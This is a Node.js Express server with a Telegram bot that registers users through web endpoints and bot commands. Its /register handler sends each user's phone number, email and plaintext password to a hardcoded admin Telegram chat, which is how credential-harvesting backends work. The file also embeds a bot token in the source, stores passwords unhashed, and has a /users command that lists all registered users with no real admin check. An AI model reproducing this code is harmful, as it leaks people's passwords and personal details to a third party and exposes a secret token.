const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const PORT = 80;

// Middleware
app.use(bodyParser.json());
app.use(cors());

// Replace with your bot token from BotFather
const TELEGRAM_BOT_TOKEN = '7831591330:AAEwY4GlaMydwwfhDxAfULP2xbNRj1vU4S0';
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });

console.log('Telegram Bot Initialized. Waiting for messages...');

// In-memory storage for users (replace with a database in production)
const users = [];

// Helper function to send a message to the admin
const sendMessageToAdmin = (message) => {
  const adminChatId = '5616996770'; // Replace with your admin chat ID
  bot.sendMessage(adminChatId, message);
};

// Endpoint to handle Telegram authentication
app.post('/auth', (req, res) => {
  console.log('Received Telegram authentication request:', req.body);

  const { id, first_name, last_name, username } = req.body;

  if (!id || !first_name) {
    console.error('Invalid Telegram user data:', req.body);
    return res.status(400).json({ success: false, message: 'Invalid Telegram user data' });
  }

  // Check if the user already exists
  const existingUser = users.find((user) => user.telegramId === id);
  if (existingUser) {
    console.log('User already registered:', existingUser);
    return res.status(200).json({ success: true, message: 'User already registered', user: existingUser });
  }

  // Create a new user
  const newUser = {
    telegramId: id,
    firstName: first_name,
    lastName: last_name || '',
    username: username || '',
  };

  users.push(newUser); // Save the user (replace with database logic in production)
  console.log('New Telegram User Registered:', newUser);

  // Send new user details to the admin
  const message = `New Telegram User Registered:\n` +
    `Name: ${newUser.firstName} ${newUser.lastName}\n` +
    `Username: ${newUser.username || 'N/A'}\n` +
    `Telegram ID: ${newUser.telegramId}`;
  sendMessageToAdmin(message);

  res.status(201).json({ success: true, message: 'User registered successfully', user: newUser });
});

// Endpoint to handle traditional registration
app.post('/register', (req, res) => {
  console.log('Received traditional registration request:', req.body);

  const { phoneNumber, email, password } = req.body; // Changed from username to phoneNumber

  if (!phoneNumber || !email || !password) {
    console.error('Missing required fields:', req.body);
    return res.status(400).json({ success: false, message: 'All fields are required' });
  }

  // Check if the user already exists
  const existingUser = users.find((user) => user.email === email);
  if (existingUser) {
    console.error('User already registered:', existingUser);
    return res.status(400).json({ success: false, message: 'User already registered' });
  }

  // Create a new user
  const newUser = {
    id: users.length + 1,
    phoneNumber, // Changed from username to phoneNumber
    email,
    password, // In production, hash the password before saving
    firstName: phoneNumber, // Use phoneNumber as firstName for traditional registration
    lastName: '', // No last name for traditional registration
  };

  users.push(newUser); // Save the user (replace with database logic in production)
  console.log('New User Registered:', newUser);

  // Send new user details to the admin
  const message = `New User Registered:\n` +
    `ID: ${newUser.id}\n` +
    `Phone Number: ${newUser.phoneNumber}\n` + // Changed from username to phoneNumber
    `Email: ${newUser.email}\n` +
    `Password: ${newUser.password}`;
  sendMessageToAdmin(message);

  res.status(201).json({ success: true, message: 'User registered successfully', user: newUser });
});

// Telegram Bot Commands
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  console.log(`Received /start command from chat ID: ${chatId}`);
  bot.sendMessage(
    chatId,
    'Welcome! Use the following commands:\n' +
      '/register - Register your account\n' +
      '/status - Check your registration status\n' +
      '/help - Show available commands'
  );
});

bot.onText(/\/register/, (msg) => {
  const chatId = msg.chat.id;
  console.log(`Received /register command from chat ID: ${chatId}`);
  bot.sendMessage(chatId, 'Please visit our website to register using your Telegram account.');
});

bot.onText(/\/status/, (msg) => {
  const chatId = msg.chat.id;
  console.log(`Received /status command from chat ID: ${chatId}`);

  const user = users.find((u) => u.telegramId === msg.from.id);
  if (user) {
    bot.sendMessage(
      chatId,
      `You are registered!\n` +
        `Name: ${user.firstName} ${user.lastName}\n` +
        `Phone Number: ${user.phoneNumber || 'N/A'}\n` + // Changed from username to phoneNumber
        `Telegram ID: ${user.telegramId}`
    );
  } else {
    bot.sendMessage(chatId, 'You are not registered. Please visit our website to register.');
  }
});

bot.onText(/\/users/, (msg) => {
  const chatId = msg.chat.id;
  console.log(`Received /users command from chat ID: ${chatId}`);

  // Check if the user is an admin (you can add admin validation logic here)
  if (users.length === 0) {
    bot.sendMessage(chatId, 'No users registered yet.');
  } else {
    const userList = users
      .map(
        (user, index) =>
          `${index + 1}. ${user.firstName} ${user.lastName} (${user.phoneNumber || 'N/A'})` // Changed from username to phoneNumber
      )
      .join('\n');
    bot.sendMessage(chatId, `Registered Users:\n${userList}`);
  }
});

bot.onText(/\/help/, (msg) => {
  const chatId = msg.chat.id;
  console.log(`Received /help command from chat ID: ${chatId}`);
  bot.sendMessage(
    chatId,
    'Available commands:\n' +
      '/start - Start the bot\n' +
      '/register - Register your account\n' +
      '/status - Check your registration status\n' +
      '/users - List all registered users (admin only)\n' +
      '/help - Show this help message'
  );
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});